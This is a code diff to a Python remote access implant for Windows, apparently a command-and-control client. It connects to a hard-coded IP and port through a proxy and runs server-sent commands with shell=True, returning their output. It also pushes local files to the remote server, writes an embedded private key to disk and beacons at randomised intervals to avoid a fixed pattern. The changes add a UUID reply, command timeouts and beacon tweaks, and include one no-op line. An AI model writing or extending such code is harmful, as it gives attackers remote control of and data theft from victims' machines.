@@ -9,6 +9,7 @@ from signal import SIGTERM
 from random import randint, uniform
 import winreg
 
+UUID = "ea4iFScQxHoSYMnztWhFyhVNOe5oZgeT"
 remote_ip = '10.0.0.18'
 remote_port = 8081
 proxy_ip = '201.94.250.116'
@@ -101,6 +102,9 @@ TZdCKivQ2PsE9Uw8BwCZYJI=
 -----END PRIVATE KEY-----'''
     with open("client_key",'w') as file:
         file.write(client_key)
+
+def push_uuid(conn):
+    send_data(conn, UUID)
 
 def delete_keys():
     try:
@@ -237,6 +241,8 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             break
         elif "[BEACON]" in data:
             beacon(conn, data)
+        elif "[UUID]" in data:
+            push_uuid(conn)
         elif "get" in data:  #find file locally then push to remote server
             if VERBOSE:
                 print_info("Received GET")
@@ -258,16 +264,28 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             #cmds = data.split()
             if VERBOSE:
                 print_info("Received cmd --> {}".format(data))
-            output = subprocess.run(data.split(), shell=True, stdin=DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
-            #output = subprocess.Popen(data.split(), shell=True, stdin=DEVNULL,stderr=DEVNULL,stdout=subprocess.PIPE)
-            #output = subprocess.check_output(data,shell=True, stderr=DEVNULL, stdin=DEVNULL )
-            #print(output)
-            if output.stderr != b"":
-                send_data(conn, output.stderr.decode('utf-8')) # send back the errors
-            elif output.stdout == b"":
-                send_data(conn, "ERROR --> {}".format(data))
+            if data.startswith("start "):
+                try:
+                    output = subprocess.call(data.split(" "), timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
+                    send_data(conn, "Command Successfully Executed (no output expected)") # send back the result
+                except subprocess.TimeoutExpired:
+                    if VERBOSE:
+                        print_warn("Command Execution Timeout Expired")
+                    send_data(conn, "Command Execution Timeout Expired")
+                
             else:
-                send_data(conn, output.stdout.decode('utf-8')) # send back the result
+                try:
+                    output = subprocess.run(data.split(" "), timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+                    if output.stderr != b"":
+                        send_data(conn, output.stderr.decode('utf-8')) # send back the errors
+                    elif output.stdout == b"":
+                        send_data(conn, "ERROR --> {}".format(data))
+                    else:
+                        send_data(conn, output.stdout.decode('utf-8')) # send back the result
+                except Exception as e:
+                    if VERBOSE:
+                        print_fail("Exception! --> {}".format(e))
+                    send_data(conn,e)
             data = "" #reset the data received
 
 def query_beacon():
@@ -281,10 +299,14 @@ def query_beacon():
     except:
         BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
 
-def beacon_drift():
-    left_bound = abs(round(uniform(.95, 1) * BEACON_INTERVAL_SETTING))
-    right_bound = abs(round(uniform(1, 1.05) * BEACON_INTERVAL_SETTING))
+def beacon_drift(value):
+    if VERBOSE:
+        print_info("Beacon Setting is: {} seconds".format(value))
+    left_bound = abs(round(uniform(.95, 1) * value))
+    right_bound = abs(round(uniform(1, 1.05) * value))
     new_interval = randint(left_bound, right_bound)
+    if VERBOSE:
+        print_info("New Beacon Value is: {} seconds".format(new_interval))
     return new_interval
 
 def main ():
@@ -300,8 +322,10 @@ def main ():
             if VERBOSE:
                 print_fail("Failed to connect")
         except ConnectionResetError:
-            if BEACON_INTERVAL_HDD is not None:
-                BEACON_INTERVAL_SETTING = BEACON_INTERVAL_HDD
+            if BEACON_INTERVAL_MEM is not None:
+                BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
+            else:
+                BEACON_INTERVAL_SETTING - BEACON_INTERVAL_HDD
             if VERBOSE:
                 print_fail("Remote end terminated the connection")
         except ConnectionAbortedError:
@@ -311,7 +335,7 @@ def main ():
                 print(e)
         finally:
             delete_keys()
-            drift = beacon_drift()
+            drift = beacon_drift(BEACON_INTERVAL_SETTING)
             if VERBOSE:
                 print_info("Sleeping for {}".format(drift))
             try:
